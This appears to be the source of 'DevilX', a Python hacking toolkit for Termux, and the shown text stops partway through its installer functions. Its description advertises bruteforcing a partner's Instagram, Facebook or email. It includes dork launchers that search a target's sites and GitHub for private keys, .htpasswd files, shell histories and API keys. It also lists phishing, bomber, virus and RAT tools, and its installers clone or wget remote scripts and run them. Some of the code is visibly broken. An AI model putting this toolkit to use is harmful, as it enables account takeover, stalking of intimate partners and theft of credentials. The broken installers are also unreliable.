#!/bin/python3
# -*- coding: utf-8 -*-  

print("\033[1;91m~\033[1;92m Loading...\n")

import os
import json
import random
import array
import requests
from time import sleep
import hashlib
import threading
import sys
from bs4 import BeautifulSoup
import smtplib
import instaloader

# Setting up looks

banner = """\033[1;91m    
░       ░░░        ░░  ░░░░  ░░  ░░  ░░░░░░░░  ░░░░  ░
▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒  ▒▒  ▒▒
▓  ▓▓▓▓  ▓▓      ▓▓▓▓▓  ▓▓  ▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓▓▓    ▓▓▓
█  ████  ██  ██████████    ████  ██  █████████  ██  ██
█       ███        █████  █████  ██        ██  ████  █
██████████████████████████████████████████████████████
     \033[1;90m github.com/VritraSecz     ~  \033[1;92m  Version: 1.1.2 """


about = """\033[1;92m
🌟 Introducing DevilX - Your Ultimate Multi-Featured Tool for Termux 🌟

DevilX, crafted in Python3, is a powerful and user-friendly tool tailored for Termux enthusiasts. Unleash its versatility across seven distinct categories, offering functionalities such as Email ID reconnaissance, Phone Number investigation, IP location tracking, Web Information Gathering, and more. Dive into a seamless experience with this tool, boasting a curated selection of 110 hacking utilities for Termux users.

🚀 Key Features:

1. Hassle-Free Hacking: Effortlessly hack your GF/BF's Instagram, Facebook, or email ID with just one click, utilizing advanced bruteforcing techniques.

2. Comprehensive Tool Repository: Access a collection of 100+ hacking tools, neatly arranged alphabetically for easy installation with just a click, ensuring a smooth experience without errors.

3. IP Address Tracking: Pinpoint the exact location of any IP address effortlessly.

4. Unhackable Passwords: Generate robust and unhackable passwords for enhanced security.

5. Web Scraping Made Easy: Scrape websites effortlessly with a single click, including the ability to download a site's source file instantly.

6. Fast Word Encryption Cracking: Crack six types of encrypted words with incredible speed—48200+ words/second.

7. Web Information Gathering: Gather essential information from websites with ease.

💡 Overview:

DevilX simplifies complex hacking tasks, enabling you to hack social media accounts, install diverse hacking tools, track IP locations, generate secure passwords, scrape websites, gather web information, and crack encrypted words—all within a user-friendly environment.

🔥 Connect with the Developer:

Encountering issues or errors? Connect with the developer via Instagram or other social media channels for prompt assistance.

- Instagram: [@haxorlex](https://www.instagram.com/haxorlex/)
- Github: [VritraSecz](https://github.com/VritraSecz)
- YouTube: [@Technolex](https://www.youtube.com/Technolex)
- Telegram: [VritraSecz](https://t.me/VritraSecz)
- Facebook: [hackerxmr](https://www.facebook.com/hackerxmr)

📢 Note: If you find value in this code, kindly give credit when using or sharing.

Happy hacking! 🔐🌐

"""

main_menu = """
        \033[1;91m[??] Select a category:

        \033[1;91m[01] \033[1;97mBruteForce 
        \033[1;91m[02] \033[1;97mWeb Scraping
        \033[1;91m[03] \033[1;97mInformation Gathering
        \033[1;91m[04] \033[1;97mHash Cracking
        \033[1;91m[05] \033[1;97mPassword Generator
        \033[1;91m[06] \033[1;97mTool Installer
        \033[1;91m[07] \033[1;97mWeb Info\033[1;92m •
        \033[1;91m[08] \033[1;97mConnect With US
        \033[1;91m[09] \033[1;97mAbout
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """


brute = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mHack Email
        \033[1;91m[02] \033[1;97mHack Facebook
        \033[1;91m[03] \033[1;97mHack Instagram
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

webscr = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mScrap an web page
        \033[1;91m[02] \033[1;97mClone website Page
        \033[1;91m[03] \033[1;97mClone Website
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

getinfo = """
        \033[1;91m[??] Select an option:

        \033[1;91m[01] \033[1;97mTrack IP Address
        \033[1;91m[02] \033[1;97mE-mail Information
        \033[1;91m[03] \033[1;97mPhone Information
        \033[1;91m[04] \033[1;97mCompany Information\033[1;92m •
        \033[1;91m[05] \033[1;97mIBAN Checker\033[1;92m •
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

liscan = """
        \033[1;91m[??]\033[1;97m Select an option:

        \033[1;91m[01] \033[1;97m Subdomain Enumaration
        \033[1;91m[02] \033[1;97m Port, DNS, Whois
        \033[1;91m[03] \033[1;97m Header Built With
        \033[1;91m[04] \033[1;97m TLS/SSL Certificates
        \033[1;91m[05] \033[1;97m Analyze
        \033[1;91m[06] \033[1;97m Wayback Machine
        \033[1;91m[07] \033[1;97m Search Engines
        \033[1;91m[08] \033[1;97m Google Dorks
        \033[1;91m[09] \033[1;97m Github Dorks P1
        \033[1;91m[10] \033[1;97m Github Dorks P2
        \033[1;91m[95] \033[1;97m Back
        \033[1;91m[99] \033[1;97m Quit

        \033[1;91mdevilx>> """

rest = """\033[0m
        \033[1;91m[??] \033[1;97mSelect Hash Type:

        \033[1;91m[01]\033[1;97m md5
        \033[1;91m[02]\033[1;97m sha1
        \033[1;91m[03]\033[1;97m sha224
        \033[1;91m[04]\033[1;97m sha256
        \033[1;91m[05]\033[1;97m sha384
        \033[1;91m[06]\033[1;97m sha512
        \033[1;91m[07]\033[1;97m sha3-224
        \033[1;91m[08]\033[1;97m sha3-256
        \033[1;91m[09]\033[1;97m sha3-384
        \033[1;91m[10]\033[1;97m sha3-512
        \033[1;91m[95]\033[1;97m Back
        \033[1;91m[99]\033[1;97m Quit

        \033[1;91mdevilx>> """

soc = """
        \033[1;91m[?] Select any options

        \033[1;91m[01] \033[1;97mInstagram
        \033[1;91m[02] \033[1;97mFacebook
        \033[1;91m[03] \033[1;97mGithub
        \033[1;91m[04] \033[1;97mYouTube
        \033[1;91m[05] \033[1;97mTelegram
        \033[1;91m[95] \033[1;97mBack
        \033[1;91m[99] \033[1;97mQuit

        \033[1;91mdevilx>> """

alltool = """
        \033[1;91m[??] Select any Tool: 

        \033[1;91m[01]\033[1;97m 007-TheBond
        \033[1;91m[02]\033[1;97m AdminHack
        \033[1;91m[03]\033[1;97m AllHackingTools
        \033[1;91m[04]\033[1;97m AOXdeface
        \033[1;91m[05]\033[1;97m apktool
        \033[1;91m[06]\033[1;97m Asura
        \033[1;91m[07]\033[1;97m B4Bomber
        \033[1;91m[08]\033[1;97m BannerX
        \033[1;91m[09]\033[1;97m Beast_Bomber
        \033[1;91m[10]\033[1;97m beyawak
        \033[1;91m[11]\033[1;97m Brutegram
        \033[1;91m[12]\033[1;97m BruteX
        \033[1;91m[13]\033[1;97m Brutex \033[1;91m[VritraSecz]
        \033[1;91m[14]\033[1;97m CAM-DUMPER
        \033[1;91m[15]\033[1;97m CloneWeb
        \033[1;91m[16]\033[1;97m Cracker-Tool
        \033[1;91m[17]\033[1;97m DarkFly
        \033[1;91m[18]\033[1;97m DecodeX
        \033[1;91m[19]\033[1;97m DefGen
        \033[1;91m[20]\033[1;97m demozz
        \033[1;91m[21]\033[1;97m Dh-All
        \033[1;91m[22]\033[1;97m DirAttack
        \033[1;91m[23]\033[1;97m dnsmap
        \033[1;91m[24]\033[1;97m DVR-Exploiter
        \033[1;91m[25]\033[1;97m EasY-HaCk
        \033[1;91m[26]\033[1;97m Findomain
        \033[1;91m[27]\033[1;97m FreeFire-Phishing
        \033[1;91m[28]\033[1;97m fsociety
        \033[1;91m[29]\033[1;97m GenVirus
        \033[1;91m[30]\033[1;97m GeonumWh
        \033[1;91m[31]\033[1;97m GH05T-INSTA
        \033[1;91m[32]\033[1;97m Gmail-Hack
        \033[1;91m[33]\033[1;97m Hacked
        \033[1;91m[34]\033[1;97m Hackerwasi
        \033[1;91m[35]\033[1;97m hacklock
        \033[1;91m[36]\033[1;97m Hammer
        \033[1;91m[37]\033[1;97m HCORat
        \033[1;91m[38]\033[1;97m h-sploit-paylod
        \033[1;91m[39]\033[1;97m httpfy
        \033[1;91m[40]\033[1;97m HXP-Ducky
        \033[1;91m[41]\033[1;97m infect
        \033[1;91m[42]\033[1;97m InfoGX
        \033[1;91m[43]\033[1;97m instahack
        \033[1;91m[44]\033[1;97m InstaReport
        \033[1;91m[45]\033[1;97m ipdrone
        \033[1;91m[46]\033[1;97m IP_Rover
        \033[1;91m[47]\033[1;97m jarvis-welcome
        \033[1;91m[48]\033[1;97m kalimux
        \033[1;91m[49]\033[1;97m Kiss-In-Termux
        \033[1;91m[50]\033[1;97m LinuxX
        \033[1;91m[51]\033[1;97m LordPhish
        \033[1;91m[52]\033[1;97m Lucifer
        \033[1;91m[53]\033[1;97m maskphish
        \033[1;91m[54]\033[1;97m M-dork
        \033[1;91m[55]\033[1;97m Mega-File-Stealer
        \033[1;91m[56]\033[1;97m Metasploit
        \033[1;91m[57]\033[1;97m modded-ubuntu
        \033[1;91m[58]\033[1;97m mrphish
        \033[1;91m[59]\033[1;97m MyServer
        \033[1;91m[60]\033[1;97m netscan
        \033[1;91m[61]\033[1;97m nikto
        \033[1;91m[62]\033[1;97m nmap
        \033[1;91m[63]\033[1;97m onex
        \033[1;91m[64]\033[1;97m osi.ig
        \033[1;91m[65]\033[1;97m Osintgram
        \033[1;91m[66]\033[1;97m parrot-in-termux
        \033[1;91m[67]\033[1;97m PassX
        \033[1;91m[68]\033[1;97m PUBG-BGMI_Phishing
        \033[1;91m[69]\033[1;97m Pureblood
        \033[1;91m[70]\033[1;97m Pycompile
        \033[1;91m[71]\033[1;97m qurxin
        \033[1;91m[72]\033[1;97m RED_HAWK
        \033[1;91m[73]\033[1;97m rsecxxx-leak
        \033[1;91m[74]\033[1;97m saycheese
        \033[1;91m[75]\033[1;97m ScannerX
        \033[1;91m[76]\033[1;97m seeker
        \033[1;91m[77]\033[1;97m seeu
        \033[1;91m[78]\033[1;97m Short-Boy
        \033[1;91m[79]\033[1;97m slowloris
        \033[1;91m[80]\033[1;97m SocialBox-Termux
        \033[1;91m[81]\033[1;97m SploitX
        \033[1;91m[82]\033[1;97m sqlmap
        \033[1;91m[83]\033[1;97m TBomb
        \033[1;91m[84]\033[1;97m TeleGram-Scraper
        \033[1;91m[85]\033[1;97m TermuxArch
        \033[1;91m[86]\033[1;97m TermuxCyberArmy
        \033[1;91m[87]\033[1;97m termux-desktop
        \033[1;91m[88]\033[1;97m termux-fingerprint
        \033[1;91m[89]\033[1;97m Termux-heroku-cli
        \033[1;91m[90]\033[1;97m termux-key
        \033[1;91m[91]\033[1;97m termux-snippets
        \033[1;91m[92]\033[1;97m thc-hydra
        \033[1;91m[93]\033[1;97m toolss
        \033[1;91m[94]\033[1;97m Tool-X
        \033[1;91m[95]\033[1;97m TORhunter
        \033[1;91m[96]\033[1;97m TraceX
        \033[1;91m[97]\033[1;97m TraceX-GUI
        \033[1;91m[98]\033[1;97m Traper-X
        \033[1;91m[99]\033[1;97m tstyle
        \033[1;91m[100]\033[1;97m tunnel
        \033[1;91m[101]\033[1;97m userfinder
        \033[1;91m[102]\033[1;97m Venomsploit
        \033[1;91m[103]\033[1;97m Viridae
        \033[1;91m[104]\033[1;97m WannaTool
        \033[1;91m[105]\033[1;97m websploit
        \033[1;91m[106]\033[1;97m WhSms
        \033[1;91m[107]\033[1;97m Xteam
        \033[1;91m[108]\033[1;97m Youtube-Pro
        \033[1;91m[109]\033[1;97m zphisher
        \033[1;91m[110]\033[1;97m zVirus-Gen
        \033[1;91m[_B_]\033[1;97m Back
        \033[1;91m[_Q_]\033[1;97m Quit

        \033[1;91mdevilx>> """

# first wave subdomain enumaration
def dnsenum():
  os.system("xdg-open https://www.virustotal.com/gui/domain/" + sitex + "/relations 2> /dev/null")
  os.system("xdg-open https://crt.sh/?q=%25." + sitex + " 2> /dev/null")
  os.system("xdg-open https://riddler.io/search?q=pld:" + sitex + " 2> /dev/null")
  os.system("xdg-open https://riddler.io/search?q=host:" + sitex + " 2> /dev/null")
  os.system("xdg-open https://riddler.io/search?q=keyword%3A" + sitex + "&view_type=data_table 2> /dev/null")
  os.system("xdg-open https://findsubdomains.com/subdomains-of/souqana.com 2> /dev/null")
  os.system("xdg-open https://dnstable.com/domain/" + sitex + " 2> /dev/null")
  os.system("xdg-open https://securitytrails.com/list/apex_domain/" + sitex + " 2> /dev/null")
  os.system("xdg-open https://certspotter.com/api/v0/certs?domain=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:*." + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:*.*." + sitex + " 2> /dev/null")


 # 2nd wave Ports/DNS/WHOis
def portis():
  os.system("xdg-open https://viewdns.info/portscan/?host=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://viewdns.info/dnsreport/?domain=" + sitex + " 2> /dev/null")
  os.system("xdg-open http://viewdns.info/reversewhois/?q=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://viewdns.info/whois/?domain=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://dnslytics.com/domain/" + sitex + " 2> /dev/null")

 # 3rd wave header built with
def header():
  os.system("xdg-open https://www.threatcrowd.org/domain.php?domain=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://securityheaders.com/?q=" + sitex + "&followRedirects=on 2> /dev/null")
  os.system("xdg-open https://viewdns.info/httpheaders/?domain=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://builtwith.com/" + sitex + " 2> /dev/null")

 # 4th wave tls/ssl certificates
def tlss():
  os.system("xdg-open https://www.ssllabs.com/ssltest/analyze.html?d=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://certdb.com/search/index?q=domain%3A%22" + sitex + "%22 2> /dev/null")
  os.system("xdg-open https://transparencyreport.google.com/https/certificates?cert_search_auth=&cert_search_cert=p:c291cWFuYS5jb206dHJ1ZTp0cnVlOjpFQUU9&cert_search=include_expired:true;include_subdomains:true;domain:" + sitex + "&lu=cert_search_cert 2> /dev/null")

 # 5th wave Analyze
def analyze():
  os.system("xdg-open http://toolbar.netcraft.com/site_report?url=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://sitecheck.sucuri.net/results/" + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.siteguarding.com/spam/viewreport?domain=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://app.upguard.com/webscan#/www." + sitex + " 2> /dev/null")
  os.system("xdg-open https://observatory.mozilla.org/analyze/" + sitex + " 2> /dev/null")

 # 6th wave Wayback machine
def wayback():
  os.system("xdg-open https://web.archive.org/web/*/" + sitex + " 2> /dev/null")

 #7th wave Search engines
def srchengne():
  os.system("xdg-open https://fofa.so/result?q=" + sitex + "&qbase64=ImZhY2Vib29rLmNvbSI%3D&full=true 2> /dev/null")
  os.system("xdg-open https://www.zoomeye.org/searchResult/bugs?q=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.zoomeye.org/searchResult?q=" + sitex + "")
  os.system("xdg-open https://www.shodan.io/search?query=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.censys.io/ipv4?q=" + sitex + " 2> /dev/null")

 # 8th wave google dorks
def godork():
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+ext:cgi+OR+ext:php+OR+ext:asp+OR+ext:aspx+OR+ext:jsp+OR+ext:jspx+OR+ext:swf+OR+ext:fla+OR+ext:xml 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+ext:doc+OR+ext:docx+OR+ext:csv+OR+ext:pdf+OR+ext:txt+OR+ext:log+OR+ext:bak 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+ext:action+OR+struts 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:pastebin.com+" + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:linkedin.com+employees+" + sitex + " 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+username+OR+password+OR+login+OR+root+OR+admin 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+inurl:shell+OR+inurl:backdoor+OR+inurl:wso+OR+inurl:cmd+OR+shadow+OR+passwd+OR+boot.ini+OR+inurl:backdoor 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+inurl:readme+OR+inurl:license+OR+inurl:install+OR+inurl:setup+OR+inurl:config 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+inurl:wp-+OR+inurl:plugin+OR+inurl:upload+OR+inurl:download 2> /dev/null")
  os.system("xdg-open https://www.google.ca/search?q=site:" + sitex + "+inurl:redir+OR+inurl:url+OR+inurl:redirect+OR+inurl:return+OR+inurl:src=http+OR+inurl:r=http 2> /dev/null")

 # 9th wave github dorks p1
def gidork1():
  os.system("xdg-open https://github.com/search?q=" + sitex + " 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:.npmrc_auth 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:.dockercfg+auth 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+extension:pem+private 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+extension:ppk+private 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:id_rsa 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:id_dsa 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+extension:sql+mysql+dump 2> /dev/null")

def gidork2():
 # 10th wave github.com p2
  os.system("xdg-open https://github.com/search?q=" + sitex + "+extension:sql+mysql+dump+password 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:.htpasswd 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+HEROKU_API_KEY+language:shell 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+HEROKU_API_KEY+language:json 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:.bash_history 2> /dev/null")
  os.system("xdg-open https://github.com/search?q=" + sitex + "+filename:.history 2> /dev/null")


################### All tool installation function ####################


# 01 seeker
def seeker():
    print(f"\n\033[1;91m[*]\033[1;97m Installing seeker.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/thewhiteh4t/seeker.git/")
    os.system("mv seeker /$HOME")
    os.system("cd /$HOME/seeker")
    os.system("chmod +x *")
    os.system("./install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Seeker is installed successfully In your Termux. You can find this tool in HOME directory\n")

# 02 findomain
def findomain():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Findomain.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install rust make perl -y")
    os.system("apt install findomain -y")
    print()
    print(f"\033[1;91m[*]\033[1;97m Findomain is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access any time this tool by command 'findomain'")
    print()

# 03 /1N3/BruteX
def brutxx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing BruteX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/1N3/BruteX.git/")
    os.system("mv BruteX /$HOME/Brutex")
    os.system("cd /$HOME/Brutex")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print(f"\033[1;91m[*]\033[1;97m BruteX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can find BruteX on HOME Directory.")
    print()

# 04 ToolX
def toolx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Tool-X.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/ekadanuarta/Tool-X.git/")
    os.system("mv Tool-X /$HOME")
    os.system("cd /$HOME/Tool-X")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print(f"\033[1;91m[*]\033[1;97m Tool-X is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access Tool-X by command 'toolx'.")
    print()

# 05 darkfly
def darkfly():
    print(f"\n\033[1;91m[*]\033[1;97m Installing DarkFly.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Ranginang67/DarkFly-2019.1")
    os.system("mv DarkFly-2019.1 /$HOME")
    os.system("cd /$HOME/DarkFly-2019.1")
    os.system("chmod +x *")
    os.system("python install.py install")
    print()
    print(f"\033[1;91m[*]\033[1;97m DarkFly is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access DarkFly by command 'DarkFly'.")
    print()

# 06 brutex VritraSecz
def mrbrutex():
    print(f"\n\033[1;91m[*]\033[1;97m Installing BruteX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/BruteX.git/")
    os.system("mv BruteX /$HOME")
    os.system("cd /$HOME/BruteX")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m BruteX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find BruteX on your Termux's home directory.")
    print()

# 07 saycheese
def saycheese():
    print(f"\n\033[1;91m[*]\033[1;97m Installing saycheese.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/saycheese.git/")
    os.system("mv saycheese /$HOME")
    os.system("cd /$HOME/saycheese")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m saycheese is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find saycheese on your termux's home directory.")
    print()

# 08 traper x
def traperx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Traper-X.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/Traper-X.git/")
    os.system("mv Traper-X /$HOME")
    os.system("cd /$HOME/Traper-X")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Traper-X is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Traper-X on your termux's home directory.")
    print()

# 09 tracex
def tracex():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TraceX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/TraceX")
    os.system("mv TraceX /$HOME")
    os.system("cd /$HOME/TraceX")
    os.system("chmod +x *")
    os.system("./setup_trmx")
    print()
    print(f"\033[1;91m[*]\033[1;97m TraceX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TraceX on your termux's home directory.")
    print()

# 10 infogx
def infogx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing InfoGX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/InfoGX.git/")
    os.system("mv InfoGX /$HOME")
    os.system("cd /$HOME/InfoGX")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m InfoGX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access InfoGX by command 'infogx'.")
    print()

# 11 toolss

def toolss():
    print(f"\n\033[1;91m[*]\033[1;97m Installing toolss.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/AnonHackerr/toolss")
    os.system("mv toolss /$HOME")
    os.system("cd /$HOME/toolss")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m toolss is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find toolss on your termux's home directory.")
    print()

# 12 tbomb
def tbomb():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TBomb.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python3 -y")
    os.system("pip3 install tbomb")
    print()
    print(f"\033[1;91m[*]\033[1;97m TBomb is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access TBomb by command 'tbomb'.")
    print()

# 13 zphisher
def zphish():
    print(f"\n\033[1;91m[*]\033[1;97m Installing zphisher.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install tur-repo zphisher -y")
    print()
    print(f"\033[1;91m[*]\033[1;97m zphisher is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access zphisher by command 'zphisher'.")
    print()

# 14 nmap
def nmap():
    print(f"\n\033[1;91m[*]\033[1;97m Installing nmap.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install nmap -y")
    print()
    print(f"\033[1;91m[*]\033[1;97m nmap is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You can access nmap by command 'nmap'.")
    print()

# 15 hydra
def hydra():
    print(f"\n\033[1;91m[*]\033[1;97m Installing thc-hydra.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python php curl wget git nano -y")
    os.system("git clone https://github.com/vanhauser-thc/thc-hydra")
    os.system("mv thc-hydra /$HOME")
    os.system("cd /$HOME/thc-hydra")
    os.system("chmod +x *")
    os.system("./configure")
    os.system("make")
    os.system("make install")
    print()
    print(f"\033[1;91m[*]\033[1;97m thc-hydra is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find thc-hydra on your termux's home directory.")
    print()

# 16 sqlmap
def sqlmap():
    print(f"\n\033[1;91m[*]\033[1;97m Installing sqlmap.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone ")
    os.system("mv  /$HOME")
    os.system("cd /$HOME/")
    os.system("chmod +x *")
    os.system("")
    print()
    print(f"\033[1;91m[*]\033[1;97m sqlmap is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find sqlmap on your termux's home directory.")
    print()

# 17 nikto

def nikto():
    print(f"\n\033[1;91m[*]\033[1;97m Installing nikto.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git perl -y")
    os.system("git clone https://github.com/sullo/nikto ")
    os.system("mv nikto /$HOME")
    os.system("cd /$HOME/nikto/program")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m nikto is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find nikto on your termux's home directory.")
    print()


# 18 fsociety
def fsociety():
    print(f"\n\033[1;91m[*]\033[1;97m Installing fsociety.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 python3 -y")
    os.system("pip install requests")
    os.system("git clone git clone https://github.com/Manisso/fsociety")
    os.system("mv fsociety /$HOME")
    os.system("cd /$HOME/fsociety")
    os.system("chmod +x *")
    os.system("")
    print()
    print(f"\033[1;91m[*]\033[1;97m fsociety is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find fsociety on your termux's home directory.")
    print()

# 19 slowloris
def slowloris():
    print(f"\n\033[1;91m[*]\033[1;97m Installing slowloris.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python3 -y")
    os.system("git clone https://github.com/gkbrk/slowloris.git")
    os.system("mv slowloris /$HOME")
    os.system("cd /$HOME/slowloris")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m slowloris is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find slowloris on your termux's home directory.")
    print()

# 20 metasploit
def metasp():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Metasploit.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few minutes to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install wget curl openssh git ncurses-utils -y")
    os.system("wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh ")
    os.system("mv metasploit.sh /$HOME")
    os.system("cd /$HOME")
    os.system("chmod +x *")
    os.system("./metasploit.sh")
    print()
